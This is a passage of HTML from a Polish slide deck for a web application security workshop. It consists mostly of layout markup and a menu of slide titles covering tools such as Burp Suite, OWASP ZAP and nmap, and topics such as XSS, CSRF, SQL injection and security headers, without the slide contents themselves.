none;"></div><div class="slide-background future" style="display: none;"></div><div class="slide-background future" style="display: none;"></div><div class="slide-background future" style="display: none;"></div><div class="slide-background future" style="display: none;"></div><div class="slide-background future" style="display: none;"></div><div class="slide-background future" style="display: none;"></div></div><div class="slide-background stack future" style="display: none;" data-loaded="true"><div class="slide-background present" style="display: none;" data-loaded="true"></div></div><div class="slide-background stack future" style="display: none;" data-loaded="true"><div class="slide-background present" style="display: none;" data-loaded="true"></div><div class="slide-background future" style="display: none;" data-loaded="true"></div><div class="slide-background future" style="display: none;" data-loaded="true"></div><div class="slide-background future" style="display: none;"></div></div><div class="slide-background future" data-background-hash="pictures/tlo_1.jpgnullnullnullnullnullnullnullnull" style="display: none; background-image: url(&quot;pictures/tlo_1.jpg&quot;);" data-loaded="true"></div><div class="slide-background stack future" style="display: none;" data-loaded="true"><div class="slide-background present" style="display: none;" data-loaded="true"></div><div class="slide-background future" data-background-hash="pictures/Slajd2.JPGnullnullnullnullnullnullnullnull" style="display: none; background-image: url(&quot;pictures/Slajd2.JPG&quot;);" data-loaded="true"></div><div class="slide-background future" data-background-hash="pictures/Slajd3.JPGnullnullnullnullnullnullnullnull" style="display: none; background-image: url(&quot;pictures/Slajd3.JPG&quot;);" data-loaded="true"></div><div class="slide-background future" data-background-hash="pictures/Slajd4.JPGnullnullnullnullnullnullnullnull" style="display: none; background-image: url(&quot;pictures/Slajd4.JPG&quot;);" data-loaded="true"></div><div class="slide-background future" data-background-hash="pictures/Slajd5.JPGnullnullnullnullnullnullnullnull" style="display: none; background-image: url(&quot;pictures/Slajd5.JPG&quot;);" data-loaded="true"></div></div></div><div class="progress" style="display: block;"><span style="width: 237.92px;"></span></div><aside class="controls" style="display: block;" data-controls-layout="bottom-right" data-controls-back-arrows="faded"><button class="navigate-left enabled" aria-label="previous slide"><div class="controls-arrow"></div></button><button class="navigate-right enabled" aria-label="next slide"><div class="controls-arrow"></div></button><button class="navigate-up enabled" aria-label="above slide"><div class="controls-arrow"></div></button><button class="navigate-down" aria-label="below slide" disabled="disabled"><div class="controls-arrow"></div></button></aside><div class="slide-number" style="display: none;"></div><div class="speaker-notes" data-prevent-swipe="" tabindex="0"></div><div class="pause-overlay"></div><div style="position: absolute; height: 1px; width: 1px; overflow: hidden; clip: rect(1px, 1px, 1px, 1px);" id="aria-status-div" aria-live="polite" aria-atomic="true">
+						Prezentacja OWASP ZAP
+						
+					</div><div id="searchinputdiv" class="searchdiv" style="position: absolute; top: 10px; right: 10px; z-index: 10; display: none;"><span><input type="search" id="searchinput" class="searchinput" style="vertical-align: top;"><img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABgAAAAYCAYAAADgdz34AAAABGdBTUEAAK/INwWK6QAAABl0RVh0U29mdHdhcmUAQWRvYmUgSW1hZ2VSZWFkeXHJZTwAAAJiSURBVHjatFZNaxNBGH5md+Mmu92NVdKDRipSAyqCghgQD4L4cRe86UUtAQ+eFCxoa4/25EXBFi8eBE+eRPoDhB6KgiiixdAPCEkx2pjvTXadd9yNsflwuyUDD/O+u8PzzDPvzOwyx3EwyCZhwG3gAkp7MnpjgbopjsltcD4gjuXZZKeAR348MYLYTm3LzOs/y3j3JTfZxgXWXmTuwPHIc4VmoOmv5IrI53+AO2DdHLjkDWQ3GoEEVFXtXQOvkSnPWcyUceviLhwbDYv8/XIVj97kse7TodLvZXxYxrPUHkQ1ufXs3FEdybEIxucySOesoNvUgWU1cP3MkCBfTFdw9fGaAMVmRELq7LBw2Q3/FaAxxWIRpw+ZIr/7IouPqzUBiqmdHAv7EuhRAwf1er2Vy4x1jW3b2d5Jfvu5IPp7l2LYbcgCFFNb+FoJ7oBqEAqFMPNqFcmEgVMJDfMT+1tvN0pNjERlMS6QA5pFOKxiKVPFhakPeL3It+WGJUDxt2wFR+JhzI7v5ctkd8DXOZAkCYYxhO+lKm4+Xfqz/rIixBuNBl7eOYzkQQNzqX249mRl6zUgEcYkaJrGhUwBinVdh6IouPzwE6/DL5w4oLkH8y981aDf+uq6hlKpJESiUdNfDZi7/ehG9K6KfiA3pml0PLcsq+cSMTj2NL9ukc4UOmz7AZ3+crkC4mHujFvXNaMFB3bEr8xPS6p5O+jXxq4VZtaen7/PwzrntjcLUE0iHPS1Ud1cdiEJl/8WivZk0wXd7zWOMkeF8s0CcAmkNrC2nvXZDbbbN73ccYnZoH9bfgswAFzAe9/h3dbKAAAAAElFTkSuQmCC" id="searchbutton" class="searchicon" style="vertical-align: top; margin-top: -1px;"></span></div><nav class="slide-menu slide-menu--left"><ol class="slide-menu-toolbar"><li data-panel="Slides" data-button="0" class="toolbar-panel-button active-toolbar-button" data-node-uid="372"><span class="slide-menu-toolbar-label">Slajdy</span><br><i class="fa fa-list"></i></li><li data-panel="Themes" data-button="1" class="toolbar-panel-button"><span class="slide-menu-toolbar-label">Themes</span><br><i class="fa fa-desktop"></i></li><li data-panel="Transitions" data-button="2" class="toolbar-panel-button"><span class="slide-menu-toolbar-label">Transitions</span><br><i class="fa fa-arrows-h"></i></li><li id="close"><span class="slide-menu-toolbar-label">Zamknij</span><br><i class="fa fa-times"></i></li></ol><div data-panel="Slides" class="slide-menu-panel active-menu-panel"><ul class="slide-menu-items"><li class="slide-menu-item past" data-item="0" data-slide-h="0" data-slide-v="0" data-node-uid="177"><span class="slide-menu-item-title">Praktyczne sposoby wykrywania podatności w aplikacjach webowych</span></li><li class="slide-menu-item past" data-item="1" data-slide-h="1" data-slide-v="0" data-node-uid="178"><span class="slide-menu-item-title">Informacje organizacyjne</span></li><li class="slide-menu-item-vertical past" data-item="2" data-slide-h="1" data-slide-v="1" data-node-uid="179"><span class="slide-menu-item-title">O mnie</span></li><li class="slide-menu-item-vertical past" data-item="3" data-slide-h="1" data-slide-v="2" data-node-uid="180"><span class="slide-menu-item-title">O Pentacomp</span></li><li class="slide-menu-item-vertical past" data-item="4" data-slide-h="1" data-slide-v="3" data-node-uid="181"><span class="slide-menu-item-title">O Women in Technology</span></li><li class="slide-menu-item-vertical past" data-item="5" data-slide-h="1" data-slide-v="4" data-node-uid="182"><span class="slide-menu-item-title">Kwestie organizacyjne</span></li><li class="slide-menu-item-vertical past" data-item="6" data-slide-h="1" data-slide-v="5" data-node-uid="183"><span class="slide-menu-item-title">O was</span></li><li class="slide-menu-item-vertical past" data-item="7" data-slide-h="1" data-slide-v="6" data-node-uid="184"><span class="slide-menu-item-title">Code of Ethics</span></li><li class="slide-menu-item-vertical past" data-item="8" data-slide-h="1" data-slide-v="7" data-node-uid="185"><span class="slide-menu-item-title">Korzystanie z prezentacji</span></li><li class="slide-menu-item-vertical past" data-item="9" data-slide-h="1" data-slide-v="8" data-node-uid="186"><span class="slide-menu-item-title">Agenda (I)</span></li><li class="slide-menu-item-vertical past" data-item="10" data-slide-h="1" data-slide-v="9" data-node-uid="187"><span class="slide-menu-item-title">Agenda (II)</span></li><li class="slide-menu-item-vertical past" data-item="11" data-slide-h="1" data-slide-v="10" data-node-uid="188"><span class="slide-menu-item-title">Agenda (III)</span></li><li class="slide-menu-item past" data-item="12" data-slide-h="2" data-slide-v="0" data-node-uid="189"><span class="slide-menu-item-title">Wprowadzenie</span></li><li class="slide-menu-item-vertical past" data-item="13" data-slide-h="2" data-slide-v="1" data-node-uid="190"><span class="slide-menu-item-title">Jakie są najczęściej występujące podatności aplikacji webowych? O jakich podatnościach ostatnio słyszeliście?</span></li><li class="slide-menu-item-vertical past" data-item="14" data-slide-h="2" data-slide-v="2" data-node-uid="191"><span class="slide-menu-item-title">Statystyki 2014 - 2018 - raport Imperva</span></li><li class="slide-menu-item-vertical past" data-item="15" data-slide-h="2" data-slide-v="3" data-node-uid="192"><span class="slide-menu-item-title">Motywacja</span></li><li class="slide-menu-item-vertical past" data-item="16" data-slide-h="2" data-slide-v="4" data-node-uid="193"><span class="slide-menu-item-title">Test penetracyjny</span></li><li class="slide-menu-item-vertical past" data-item="17" data-slide-h="2" data-slide-v="5" data-node-uid="194"><span class="slide-menu-item-title">Test penetracyjny - audyt - test bezpieczeństwa</span></li><li class="slide-menu-item-vertical past" data-item="18" data-slide-h="2" data-slide-v="6" data-node-uid="195"><span class="slide-menu-item-title">Ile milionów haseł uzytkowników Facebooka było dostępnych bez szyfrowania?</span></li><li class="slide-menu-item past" data-item="19" data-slide-h="3" data-slide-v="0" data-node-uid="196"><span class="slide-menu-item-title">Lokalne Proxy</span></li><li class="slide-menu-item-vertical past" data-item="20" data-slide-h="3" data-slide-v="1" data-node-uid="197"><span class="slide-menu-item-title">Kilka pytań :)</span></li><li class="slide-menu-item-vertical past" data-item="21" data-slide-h="3" data-slide-v="2" data-node-uid="198"><span class="slide-menu-item-title">Narzędzia typu lokalnego Proxy</span></li><li class="slide-menu-item-vertical past" data-item="22" data-slide-h="3" data-slide-v="3" data-node-uid="199"><span class="slide-menu-item-title">Burp Suite (I)</span></li><li class="slide-menu-item-vertical past" data-item="23" data-slide-h="3" data-slide-v="4" data-node-uid="200"><span class="slide-menu-item-title">Burp Suite (II)</span></li><li class="slide-menu-item-vertical past" data-item="24" data-slide-h="3" data-slide-v="5" data-node-uid="201"><span class="slide-menu-item-title">Instalacja certyfikatu Burp - Firefox</span></li><li class="slide-menu-item-vertical past" data-item="25" data-slide-h="3" data-slide-v="6" data-node-uid="202"><span class="slide-menu-item-title">Instalacja certyfikatu Burp - IE</span></li><li class="slide-menu-item-vertical past" data-item="26" data-slide-h="3" data-slide-v="7" data-node-uid="203"><span class="slide-menu-item-title">Instalacja certyfikatu Burp</span></li><li class="slide-menu-item-vertical past" data-item="27" data-slide-h="3" data-slide-v="8" data-node-uid="204"><span class="slide-menu-item-title">Burp Suite Professional</span></li><li class="slide-menu-item-vertical active" data-item="28" data-slide-h="3" data-slide-v="9" data-node-uid="205"><span class="slide-menu-item-title">Prezentacja OWASP ZAP</span></li><li class="slide-menu-item future" data-item="29" data-slide-h="4" data-slide-v="0" data-node-uid="206"><span class="slide-menu-item-title">BadStore - aplikacja do ćwiczeń</span></li><li class="slide-menu-item future" data-item="30" data-slide-h="5" data-slide-v="0" data-node-uid="207"><span class="slide-menu-item-title">Ćwiczenie 1</span></li><li class="slide-menu-item future" data-item="31" data-slide-h="6" data-slide-v="0" data-node-uid="208"><span class="slide-menu-item-title">OWASP</span></li><li class="slide-menu-item-vertical future" data-item="32" data-slide-h="6" data-slide-v="1" data-node-uid="209"><span class="slide-menu-item-title">Organizacja OWASP</span></li><li class="slide-menu-item-vertical future" data-item="33" data-slide-h="6" data-slide-v="2" data-node-uid="210"><span class="slide-menu-item-title">Projekty OWASP</span></li><li class="slide-menu-item-vertical future" data-item="34" data-slide-h="6" data-slide-v="3" data-node-uid="211"><span class="slide-menu-item-title">OWASP Cheat Sheet Series</span></li><li class="slide-menu-item-vertical future" data-item="35" data-slide-h="6" data-slide-v="4" data-node-uid="212"><span class="slide-menu-item-title">OWASP Top 10 (2017)</span></li><li class="slide-menu-item-vertical future" data-item="36" data-slide-h="6" data-slide-v="5" data-node-uid="213"><span class="slide-menu-item-title">OWASP Top 10 (2017) - Linki</span></li><li class="slide-menu-item-vertical future" data-item="37" data-slide-h="6" data-slide-v="6" data-node-uid="214"><span class="slide-menu-item-title">OWASP Top Ten Proactive Controls</span></li><li class="slide-menu-item-vertical future" data-item="38" data-slide-h="6" data-slide-v="7" data-node-uid="215"><span class="slide-menu-item-title">Narzędzie OWASP ZAP</span></li><li class="slide-menu-item-vertical future" data-item="39" data-slide-h="6" data-slide-v="8" data-node-uid="216"><span class="slide-menu-item-title">OWASP Dependency Check (I)</span></li><li class="slide-menu-item-vertical future" data-item="40" data-slide-h="6" data-slide-v="9" data-node-uid="217"><span class="slide-menu-item-title">OWASP Dependency Check (II)</span></li><li class="slide-menu-item-vertical future" data-item="41" data-slide-h="6" data-slide-v="10" data-node-uid="218"><span class="slide-menu-item-title">OWASP Dependency Check (III)</span></li><li class="slide-menu-item future" data-item="42" data-slide-h="7" data-slide-v="0" data-node-uid="219"><span class="slide-menu-item-title">Ćwiczenie 2</span></li><li class="slide-menu-item future" data-item="43" data-slide-h="8" data-slide-v="0" data-node-uid="220"><span class="slide-menu-item-title">Aplikacja webowa - podstawowe informacje</span></li><li class="slide-menu-item-vertical future" data-item="44" data-slide-h="8" data-slide-v="1" data-node-uid="221"><span class="slide-menu-item-title">Definicja</span></li><li class="slide-menu-item-vertical future" data-item="45" data-slide-h="8" data-slide-v="2" data-node-uid="222"><span class="slide-menu-item-title">Model Klient - Serwer</span></li><li class="slide-menu-item-vertical future" data-item="46" data-slide-h="8" data-slide-v="3" data-node-uid="223"><span class="slide-menu-item-title">URL</span></li><li class="slide-menu-item-vertical future" data-item="47" data-slide-h="8" data-slide-v="4" data-node-uid="224"><span class="slide-menu-item-title">Żądanie</span></li><li class="slide-menu-item-vertical future" data-item="48" data-slide-h="8" data-slide-v="5" data-node-uid="225"><span class="slide-menu-item-title">Metoda GET</span></li><li class="slide-menu-item-vertical future" data-item="49" data-slide-h="8" data-slide-v="6" data-node-uid="226"><span class="slide-menu-item-title">Metoda POST</span></li><li class="slide-menu-item-vertical future" data-item="50" data-slide-h="8" data-slide-v="7" data-node-uid="227"><span class="slide-menu-item-title">Odpowiedź</span></li><li class="slide-menu-item-vertical future" data-item="51" data-slide-h="8" data-slide-v="8" data-node-uid="228"><span class="slide-menu-item-title">Dane wrażliwe w GET (I)</span></li><li class="slide-menu-item-vertical future" data-item="52" data-slide-h="8" data-slide-v="9" data-node-uid="229"><span class="slide-menu-item-title">Dane wrażliwe w GET (II)</span></li><li class="slide-menu-item-vertical future" data-item="53" data-slide-h="8" data-slide-v="10" data-node-uid="230"><span class="slide-menu-item-title">Dane wrażliwe w GET (III)</span></li><li class="slide-menu-item future" data-item="54" data-slide-h="9" data-slide-v="0" data-node-uid="231"><span class="slide-menu-item-title">Google Hacking</span></li><li class="slide-menu-item-vertical future" data-item="55" data-slide-h="9" data-slide-v="1" data-node-uid="232"><span class="slide-menu-item-title">Definicja</span></li><li class="slide-menu-item-vertical future" data-item="56" data-slide-h="9" data-slide-v="2" data-node-uid="233"><span class="slide-menu-item-title">Przykładowe zapytania (I)</span></li><li class="slide-menu-item-vertical future" data-item="57" data-slide-h="9" data-slide-v="3" data-node-uid="234"><span class="slide-menu-item-title">Przykładowe zapytania (II)</span></li><li class="slide-menu-item-vertical future" data-item="58" data-slide-h="9" data-slide-v="4" data-node-uid="235"><span class="slide-menu-item-title">Shodan</span></li><li class="slide-menu-item-vertical future" data-item="59" data-slide-h="9" data-slide-v="5" data-node-uid="236"><span class="slide-menu-item-title">Shodan</span></li><li class="slide-menu-item-vertical future" data-item="60" data-slide-h="9" data-slide-v="6" data-node-uid="237"><span class="slide-menu-item-title">Co w ten sposób znajdziemy?</span></li><li class="slide-menu-item future" data-item="61" data-slide-h="10" data-slide-v="0" data-node-uid="238"><span class="slide-menu-item-title">Ćwiczenie 3</span></li><li class="slide-menu-item future" data-item="62" data-slide-h="11" data-slide-v="0" data-node-uid="239"><span class="slide-menu-item-title">Skanowanie portów</span></li><li class="slide-menu-item-vertical future" data-item="63" data-slide-h="11" data-slide-v="1" data-node-uid="240"><span class="slide-menu-item-title">Porty (I)</span></li><li class="slide-menu-item-vertical future" data-item="64" data-slide-h="11" data-slide-v="2" data-node-uid="241"><span class="slide-menu-item-title">Porty (II)</span></li><li class="slide-menu-item-vertical future" data-item="65" data-slide-h="11" data-slide-v="3" data-node-uid="242"><span class="slide-menu-item-title">Well-known ports</span></li><li class="slide-menu-item-vertical future" data-item="66" data-slide-h="11" data-slide-v="4" data-node-uid="243"><span class="slide-menu-item-title">Nmap (Network mapper)</span></li><li class="slide-menu-item-vertical future" data-item="67" data-slide-h="11" data-slide-v="5" data-node-uid="244"><span class="slide-menu-item-title">Three-way Handshake</span></li><li class="slide-menu-item-vertical future" data-item="68" data-slide-h="11" data-slide-v="6" data-node-uid="245"><span class="slide-menu-item-title">TCP SYN (Stealth) Scan</span></li><li class="slide-menu-item-vertical future" data-item="69" data-slide-h="11" data-slide-v="7" data-node-uid="246"><span class="slide-menu-item-title">UDP</span></li><li class="slide-menu-item-vertical future" data-item="70" data-slide-h="11" data-slide-v="8" data-node-uid="247"><span class="slide-menu-item-title">Nmap (Network mapper)</span></li><li class="slide-menu-item-vertical future" data-item="71" data-slide-h="11" data-slide-v="9" data-node-uid="248"><span class="slide-menu-item-title">Polecenie skanowania TCP SYN</span></li><li class="slide-menu-item-vertical future" data-item="72" data-slide-h="11" data-slide-v="10" data-node-uid="249"><span class="slide-menu-item-title">Gnerowanie raportu HTML</span></li><li class="slide-menu-item-vertical future" data-item="73" data-slide-h="11" data-slide-v="11" data-node-uid="250"><span class="slide-menu-item-title">Graficzna wersja programu nmap - Zenmap</span></li><li class="slide-menu-item-vertical future" data-item="74" data-slide-h="11" data-slide-v="12" data-node-uid="251"><span class="slide-menu-item-title">Skrypty NSE</span></li><li class="slide-menu-item-vertical future" data-item="75" data-slide-h="11" data-slide-v="13" data-node-uid="252"><span class="slide-menu-item-title">Skrypt NSE nmap_vulners (I)</span></li><li class="slide-menu-item-vertical future" data-item="76" data-slide-h="11" data-slide-v="14" data-node-uid="253"><span class="slide-menu-item-title">Skrypt NSE nmap_vulners (II)</span></li><li class="slide-menu-item-vertical future" data-item="77" data-slide-h="11" data-slide-v="15" data-node-uid="254"><span class="slide-menu-item-title">Polecenie skanowania z wykorzystaniem nmap_vulners</span></li><li class="slide-menu-item-vertical future" data-item="78" data-slide-h="11" data-slide-v="16" data-node-uid="255"><span class="slide-menu-item-title">Inne narzędzia</span></li><li class="slide-menu-item-vertical future" data-item="79" data-slide-h="11" data-slide-v="17" data-node-uid="256"><span class="slide-menu-item-title">Bazy danych podatności</span></li><li class="slide-menu-item future" data-item="80" data-slide-h="12" data-slide-v="0" data-node-uid="257"><span class="slide-menu-item-title">Ćwiczenie 4</span></li><li class="slide-menu-item future" data-item="81" data-slide-h="13" data-slide-v="0" data-node-uid="258"><span class="slide-menu-item-title">Cross-Site Scripting - XSS</span></li><li class="slide-menu-item-vertical future" data-item="82" data-slide-h="13" data-slide-v="1" data-node-uid="259"><span class="slide-menu-item-title">Cross-Site Scripting - XSS (I)</span></li><li class="slide-menu-item-vertical future" data-item="83" data-slide-h="13" data-slide-v="2" data-node-uid="260"><span class="slide-menu-item-title">Cross-Site Scripting - XSS (II)</span></li><li class="slide-menu-item-vertical future" data-item="84" data-slide-h="13" data-slide-v="3" data-node-uid="261"><span class="slide-menu-item-title">Stored XSS</span></li><li class="slide-menu-item-vertical future" data-item="85" data-slide-h="13" data-slide-v="4" data-node-uid="262"><span class="slide-menu-item-title">Reflected XSS</span></li><li class="slide-menu-item-vertical future" data-item="86" data-slide-h="13" data-slide-v="5" data-node-uid="263"><span class="slide-menu-item-title">XSS Lokator</span></li><li class="slide-menu-item-vertical future" data-item="87" data-slide-h="13" data-slide-v="6" data-node-uid="264"><span class="slide-menu-item-title">XSS Standardowy Payload</span></li><li class="slide-menu-item-vertical future" data-item="88" data-slide-h="13" data-slide-v="7" data-node-uid="265"><span class="slide-menu-item-title">Przykład wykonania XSS</span></li><li class="slide-menu-item future" data-item="89" data-slide-h="14" data-slide-v="0" data-node-uid="266"><span class="slide-menu-item-title">Ćwiczenie 5</span></li><li class="slide-menu-item-vertical future" data-item="90" data-slide-h="14" data-slide-v="1" data-node-uid="267"><span class="slide-menu-item-title">Serwer HTTP z wykorzystaniem Pythona</span></li><li class="slide-menu-item-vertical future" data-item="91" data-slide-h="14" data-slide-v="2" data-node-uid="268"><span class="slide-menu-item-title">Kradzież plików cookie</span></li><li class="slide-menu-item future" data-item="92" data-slide-h="15" data-slide-v="0" data-node-uid="269"><span class="slide-menu-item-title">Wykorzystanie podatności Cross-Site Scripting (XSS)</span></li><li class="slide-menu-item-vertical future" data-item="93" data-slide-h="15" data-slide-v="1" data-node-uid="270"><span class="slide-menu-item-title">Browser Exploitation Framework - BeEF (I)</span></li><li class="slide-menu-item-vertical future" data-item="94" data-slide-h="15" data-slide-v="2" data-node-uid="271"><span class="slide-menu-item-title">Browser Exploitation Framework - BeEF (II)</span></li><li class="slide-menu-item-vertical future" data-item="95" data-slide-h="15" data-slide-v="3" data-node-uid="272"><span class="slide-menu-item-title">Browser Exploitation Framework - BeEF (III)</span></li><li class="slide-menu-item-vertical future" data-item="96" data-slide-h="15" data-slide-v="4" data-node-uid="273"><span class="slide-menu-item-title">Browser Exploitation Framework - BeEF (IV)</span></li><li class="slide-menu-item-vertical future" data-item="97" data-slide-h="15" data-slide-v="5" data-node-uid="274"><span class="slide-menu-item-title">Browser Exploitation Framework - BeEF (V)</span></li><li class="slide-menu-item future" data-item="98" data-slide-h="16" data-slide-v="0" data-node-uid="275"><span class="slide-menu-item-title">XSS - Metody ochrony</span></li><li class="slide-menu-item-vertical future" data-item="99" data-slide-h="16" data-slide-v="1" data-node-uid="276"><span class="slide-menu-item-title">Enkodowanie</span></li><li class="slide-menu-item-vertical future" data-item="100" data-slide-h="16" data-slide-v="2" data-node-uid="277"><span class="slide-menu-item-title">HttpOnly i .NET Request Validation</span></li><li class="slide-menu-item-vertical future" data-item="101" data-slide-h="16" data-slide-v="3" data-node-uid="278"><span class="slide-menu-item-title">Przykładowy podatny kod</span></li><li class="slide-menu-item-vertical future" data-item="102" data-slide-h="16" data-slide-v="4" data-node-uid="279"><span class="slide-menu-item-title">Przykładowy poprawiony kod</span></li><li class="slide-menu-item future" data-item="103" data-slide-h="17" data-slide-v="0" data-node-uid="280"><span class="slide-menu-item-title">Ćwiczenie 6</span></li><li class="slide-menu-item future" data-item="104" data-slide-h="18" data-slide-v="0" data-node-uid="281"><span class="slide-menu-item-title">Przykładowe podatności XSS z popularnych serwisów</span></li><li class="slide-menu-item-vertical future" data-item="105" data-slide-h="18" data-slide-v="1" data-node-uid="282"><span class="slide-menu-item-title">Przykład #1 – Facebook (I)</span></li><li class="slide-menu-item-vertical future" data-item="106" data-slide-h="18" data-slide-v="2" data-node-uid="283"><span class="slide-menu-item-title">Przykład #1 – Facebook (II)</span></li><li class="slide-menu-item-vertical future" data-item="107" data-slide-h="18" data-slide-v="3" data-node-uid="284"><span class="slide-menu-item-title">Przykład #1 – Facebook (III)</span></li><li class="slide-menu-item-vertical future" data-item="108" data-slide-h="18" data-slide-v="4" data-node-uid="285"><span class="slide-menu-item-title">Przykład #2 – Linkedin (I)</span></li><li class="slide-menu-item-vertical future" data-item="109" data-slide-h="18" data-slide-v="5" data-node-uid="286"><span class="slide-menu-item-title">Przykład #2 – Linkedin (II)</span></li><li class="slide-menu-item future" data-item="110" data-slide-h="19" data-slide-v="0" data-node-uid="287"><span class="slide-menu-item-title">Retrospekcja</span></li><li class="slide-menu-item-vertical future" data-item="111" data-slide-h="19" data-slide-v="1" data-node-uid="288"><span class="slide-menu-item-title">Co udało się już omówić? (I)</span></li><li class="slide-menu-item-vertical future" data-item="112" data-slide-h="19" data-slide-v="2" data-node-uid="289"><span class="slide-menu-item-title">Co udało się już omówić? (II)</span></li><li class="slide-menu-item future" data-item="113" data-slide-h="20" data-slide-v="0" data-node-uid="290"><span class="slide-menu-item-title">Cross-Site Request Forgery - CSRF</span></li><li class="slide-menu-item-vertical future" data-item="114" data-slide-h="20" data-slide-v="1" data-node-uid="291"><span class="slide-menu-item-title">Cross-Site Request Forgery - CSRF (I)</span></li><li class="slide-menu-item-vertical future" data-item="115" data-slide-h="20" data-slide-v="2" data-node-uid="292"><span class="slide-menu-item-title">Cross-Site Request Forgery - CSRF (II)</span></li><li class="slide-menu-item-vertical future" data-item="116" data-slide-h="20" data-slide-v="3" data-node-uid="293"><span class="slide-menu-item-title">Cross-Site Request Forgery - CSRF (III)</span></li><li class="slide-menu-item-vertical future" data-item="117" data-slide-h="20" data-slide-v="4" data-node-uid="294"><span class="slide-menu-item-title">Cross-Site Request Forgery - CSRF (IV)</span></li><li class="slide-menu-item future" data-item="118" data-slide-h="21" data-slide-v="0" data-node-uid="295"><span class="slide-menu-item-title">Ćwiczenie 7</span></li><li class="slide-menu-item-vertical future" data-item="119" data-slide-h="21" data-slide-v="1" data-node-uid="296"><span class="slide-menu-item-title">Przykład formularza do ataku CSRF</span></li><li class="slide-menu-item future" data-item="120" data-slide-h="22" data-slide-v="0" data-node-uid="297"><span class="slide-menu-item-title">SQL Injection</span></li><li class="slide-menu-item-vertical future" data-item="121" data-slide-h="22" data-slide-v="1" data-node-uid="298"><span class="slide-menu-item-title">SQL Injection - podstawowe informacje</span></li><li class="slide-menu-item-vertical future" data-item="122" data-slide-h="22" data-slide-v="2" data-node-uid="299"><span class="slide-menu-item-title">SQL Injection - przykład</span></li><li class="slide-menu-item-vertical future" data-item="123" data-slide-h="22" data-slide-v="3" data-node-uid="300"><span class="slide-menu-item-title">SQL Injection - testowanie</span></li><li class="slide-menu-item-vertical future" data-item="124" data-slide-h="22" data-slide-v="4" data-node-uid="301"><span class="slide-menu-item-title">SQL Injection - komentarze</span></li><li class="slide-menu-item-vertical future" data-item="125" data-slide-h="22" data-slide-v="5" data-node-uid="302"><span class="slide-menu-item-title">Funkcja LOAD_FILE()</span></li><li class="slide-menu-item future" data-item="126" data-slide-h="23" data-slide-v="0" data-node-uid="303"><span class="slide-menu-item-title">Ćwiczenie 8</span></li><li class="slide-menu-item future" data-item="127" data-slide-h="24" data-slide-v="0" data-node-uid="304"><span class="slide-menu-item-title">Ćwiczenie 9</span></li><li class="slide-menu-item future" data-item="128" data-slide-h="25" data-slide-v="0" data-node-uid="305"><span class="slide-menu-item-title">Ćwiczenie 10</span></li><li class="slide-menu-item future" data-item="129" data-slide-h="26" data-slide-v="0" data-node-uid="306"><span class="slide-menu-item-title">Ćwiczenie 11</span></li><li class="slide-menu-item future" data-item="130" data-slide-h="27" data-slide-v="0" data-node-uid="307"><span class="slide-menu-item-title">Ankieta</span></li><li class="slide-menu-item future" data-item="131" data-slide-h="28" data-slide-v="0" data-node-uid="308"><span class="slide-menu-item-title">Broken Access Control</span></li><li class="slide-menu-item-vertical future" data-item="132" data-slide-h="28" data-slide-v="1" data-node-uid="309"><span class="slide-menu-item-title">Broken Access Control (I)</span></li><li class="slide-menu-item-vertical future" data-item="133" data-slide-h="28" data-slide-v="2" data-node-uid="310"><span class="slide-menu-item-title">Broken Access Control (II)</span></li><li class="slide-menu-item-vertical future" data-item="134" data-slide-h="28" data-slide-v="3" data-node-uid="311"><span class="slide-menu-item-title">Broken Access Control (III)</span></li><li class="slide-menu-item-vertical future" data-item="135" data-slide-h="28" data-slide-v="4" data-node-uid="312"><span class="slide-menu-item-title">Broken Access Control - Testowanie (I)</span></li><li class="slide-menu-item-vertical future" data-item="136" data-slide-h="28" data-slide-v="5" data-node-uid="313"><span class="slide-menu-item-title">Broken Access Control - Testowanie (II)</span></li><li class="slide-menu-item-vertical future" data-item="137" data-slide-h="28" data-slide-v="6" data-node-uid="314"><span class="slide-menu-item-title">Broken Access Control - Testowanie (III)</span></li><li class="slide-menu-item future" data-item="138" data-slide-h="29" data-slide-v="0" data-node-uid="315"><span class="slide-menu-item-title">Ćwiczenie 12</span></li><li class="slide-menu-item future" data-item="139" data-slide-h="30" data-slide-v="0" data-node-uid="316"><span class="slide-menu-item-title">Wireshark</span></li><li class="slide-menu-item-vertical future" data-item="140" data-slide-h="30" data-slide-v="1" data-node-uid="317"><span class="slide-menu-item-title">Wireshark</span></li><li class="slide-menu-item-vertical future" data-item="141" data-slide-h="30" data-slide-v="2" data-node-uid="318"><span class="slide-menu-item-title">Filtrowanie i wyszukiwanie w Wireshark</span></li><li class="slide-menu-item-vertical future" data-item="142" data-slide-h="30" data-slide-v="3" data-node-uid="319"><span class="slide-menu-item-title">Wireshark - GUI</span></li><li class="slide-menu-item-vertical future" data-item="143" data-slide-h="30" data-slide-v="4" data-node-uid="320"><span class="slide-menu-item-title">Wireshark - Wyszukiwanie po zawartości pakietu</span></li><li class="slide-menu-item future" data-item="144" data-slide-h="31" data-slide-v="0" data-node-uid="321"><span class="slide-menu-item-title">Ćwiczenie 13</span></li><li class="slide-menu-item future" data-item="145" data-slide-h="32" data-slide-v="0" data-node-uid="322"><span class="slide-menu-item-title">Skanery automatyczne</span></li><li class="slide-menu-item-vertical future" data-item="146" data-slide-h="32" data-slide-v="1" data-node-uid="323"><span class="slide-menu-item-title">Skanery automatyczne</span></li><li class="slide-menu-item-vertical future" data-item="147" data-slide-h="32" data-slide-v="2" data-node-uid="324"><span class="slide-menu-item-title">Arachni</span></li><li class="slide-menu-item-vertical future" data-item="148" data-slide-h="32" data-slide-v="3" data-node-uid="325"><span class="slide-menu-item-title">OpenVas</span></li><li class="slide-menu-item future" data-item="149" data-slide-h="33" data-slide-v="0" data-node-uid="326"><span class="slide-menu-item-title">Nagłowki bezpieczeństwa</span></li><li class="slide-menu-item-vertical future" data-item="150" data-slide-h="33" data-slide-v="1" data-node-uid="327"><span class="slide-menu-item-title">Nagłowki bezpieczeństwa</span></li><li class="slide-menu-item-vertical future" data-item="151" data-slide-h="33" data-slide-v="2" data-node-uid="328"><span class="slide-menu-item-title">X-Frame-Options</span></li><li class="slide-menu-item-vertical future" data-item="152" data-slide-h="33" data-slide-v="3" data-node-uid="329"><span class="slide-menu-item-title">Content Security Policy</span></li><li class="slide-menu-item-vertical future" data-item="153" data-slide-h="33" data-slide-v="4" data-node-uid="330"><span class="slide-menu-item-title">X-XSS-Protection (I)</span></li><li class="slide-menu-item-vertical future" data-item="154" data-slide-h="33" data-slide-v="5" data-node-uid="331"><span class="slide-menu-item-title">X-XSS-Protection (II)</span></li><li class="slide-menu-item-vertical future" data-item="155" data-slide-h="33" data-slide-v="6" data-node-uid="332"><span 